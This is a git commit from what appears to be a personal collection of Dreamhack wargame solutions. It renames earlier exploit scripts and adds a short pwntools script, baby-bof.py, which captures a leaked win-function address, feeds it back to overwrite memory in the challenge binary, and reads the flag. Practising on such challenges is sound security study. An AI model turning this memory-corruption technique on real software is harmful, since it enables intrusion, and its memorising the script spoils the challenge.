1d7f368a65cc23f0d62d40ffb434893d29f92e51
alfldo <alfldo1012@naver.com>
2025-07-17 00:25:48 +0900

    new file:   dreamhack/baby-bof.py 	renamed:    dreamhack/basic_exploitation_000/shell.py -> dreamhack/basic_exploitation_000.py 	renamed:    dreamhack/basic_exploitation_001/shell.py -> dreamhack/basic_exploitation_001.py 	renamed:    dreamhack/rop/shell.py -> dreamhack/rop.py

---
+++ dreamhack/baby-bof.py
@@ -0,0 +1,12 @@
+from pwn import *
+p = process("baby-bof")
+#p = remote("host8.dreamhack.games",21292)
+p.recvuntil(b"(0x")
+win = p.recvuntil(b')')[:-1]
+p.sendlineafter(b"name: ",b'1')
+p.sendlineafter(b"value: ",win)
+p.sendlineafter(b"count: ",b'4')
+p.recvuntil(b"!")
+flag = p.recvline()
+p.interactive()
+print(flag)
